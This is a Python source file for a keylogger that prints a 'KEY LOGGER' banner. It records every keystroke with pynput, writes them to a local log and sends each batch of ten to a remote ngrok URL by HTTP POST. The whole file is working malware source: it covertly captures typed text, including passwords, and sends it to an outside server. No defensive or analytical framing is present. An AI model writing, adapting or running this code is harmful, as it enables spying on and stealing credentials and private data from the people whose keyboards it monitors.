import logging
from pynput.keyboard import Listener, Key
import os
import requests
import time
import pyfiglet

# Use pyfiglet for CLI art as requested
ascii_banner = pyfiglet.figlet_format("KEY LOGGER")
print(ascii_banner)

print(r"""
GitHub:https://github.com/Stalin-143
""")

# Ask user for the desired log file location
log_location = input("Please enter the full path for the log file (e.g., /path/to/logfile.txt): ")

# Ensure the log directory exists
log_dir = os.path.dirname(log_location)
if not os.path.exists(log_dir) and log_dir != "":
    try:
        os.makedirs(log_dir, exist_ok=True)  # Allows creation if directory doesn't exist
    except PermissionError as e:
        print(f"PermissionError: {e}")
        print("Please ensure you have permission to write to the specified path.")
        exit()

# Configure logging to write to the specified location
logging.basicConfig(
    filename=log_location,
    level=logging.DEBUG,
    format="%(asctime)s: %(message)s"
)

# Store the captured keys temporarily before sending them to the server
buffer = []

# Ask user for the ngrok server URL
url = input("Enter the ngrok server URL (e.g., https://xxxx-xxxx.ngrok-free.app): ")

# Function to send log data to the web server
def send_log_to_server():
    global buffer
    if buffer:
        try:
            log_data = ''.join(buffer)
            response = requests.post(url, data={"log": log_data})

            if response.status_code == 200:
                print("Log sent successfully!")
            else:
                print(f"Failed to send log. Server responded with status: {response.status_code}")
            
            # Clear the buffer after sending
            buffer = []
        
        except Exception as e:
            print(f"Error sending log: {e}")

# Function to handle key press events
def on_press(key):
    global buffer

    try:
        # Capture the key press and format it
        if hasattr(key, 'char') and key.char is not None:
            key_str = f"Key pressed: {key.char}"
        else:
            # Handle special keys
            key_str = f"Special key pressed: {key}"

        # Log the key
        logging.info(key_str)
        buffer.append(key_str + "\n")  # Add to buffer

        # If buffer reaches a certain size, send the log
        if len(buffer) >= 10:  # Adjust batch size as needed
            send_log_to_server()

    except Exception as e:
        print(f"Error logging key: {e}")

# Function to handle key release events (optional)
def on_release(key):
    # Stop listener when 'esc' is pressed
    if key == Key.esc:
        return False

# Start listening for keyboard events
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

    # Send logs when the listener stops (or periodically if needed)
    send_log_to_server()